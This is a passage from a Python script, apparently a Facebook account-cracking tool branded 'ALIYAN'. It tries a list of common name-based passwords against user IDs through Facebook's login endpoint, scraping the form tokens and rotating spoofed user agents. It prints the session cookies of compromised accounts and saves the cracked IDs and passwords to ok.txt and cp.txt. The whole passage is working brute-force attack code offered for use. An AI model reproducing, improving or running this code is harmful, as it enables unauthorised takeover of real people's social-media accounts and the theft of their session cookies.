			pwx = [guru,'khankhan','khankhan123','malikmalik','baloch','pakistan','khan12345','alikhan12345','aliali','janjan','ali1122','khann1122','khan12','khan123','khan786']
			yaari.submit(rcrack,uid,pwx,tl)
	print(47*"-")
	print('[✓] Crack process has been completed')
	print('[?] Ids saved in ok.txt,cp.txt')
	print(47*"-")
	print(' Press Inter To Back Menu')
	menu()
    
def rcrack(uid,pwx,tl):
	global loop
	global oks
	global agents
	try:
		for ps in pwx:
			session = requests.Session()
			pro = random.choice(agents)
			free_fb = session.get('https://x.facebook.com').text
			log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":uid,
			"pass":ps,
			"login":"Log In"}
			header_freefb = {'authority': 'www.facebook.com',
            'method': 'GET',
            'path': 'https://www.facebook.com/?_rdc=1&_rdr',
            'scheme': 'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'cache-control': 'max-age=0',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.61"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"13.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': pro}
			lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8,%27,',data=log_data,headers=header_freefb).text
			log_cookies=session.cookies.get_dict().keys()
			#print(iid+'|'+pws+'|'+str(log_cookies))
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[7:22]
				print('\033[1;92m[ALIYAN-OK] '+uid+' | '+ps+'\033[0;97m')
				print(f"\033[1;33mCOOKIE : \033[1;37m{coki}")
				open('ok.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[24:39]
				print('\033[1;91m[ALIYAN-CP] '+uid+' | '+ps+'\033[0;97m')
				#print(f"\n\033[1;33mCOOKIE : \033[1;37m{coki}")
				open('cp.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
		loop+=1
		sys.stdout.write('\r[\033[1;92mALIYAN\033[1;97m] [%s/%s]>[\033[1;32mOK\033[1;97m:-\033[1;92m%s\033[1;97m]-[CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
menu() 
